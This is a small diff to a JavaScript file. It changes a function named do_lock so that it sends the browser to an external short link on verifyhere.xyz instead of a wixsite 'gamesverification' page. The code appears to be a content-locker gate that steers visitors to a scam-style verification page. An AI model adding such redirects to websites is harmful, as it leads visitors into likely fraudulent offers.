@@ -1001,5 +1001,5 @@ $(window).load(function () {
 });
 
 function do_lock() {
-  window.location("https://glitchandgrind.wixsite.com/gamesverification");
+  window.location.href = "https://verifyhere.xyz/cl/i/6dxw9m";
 }
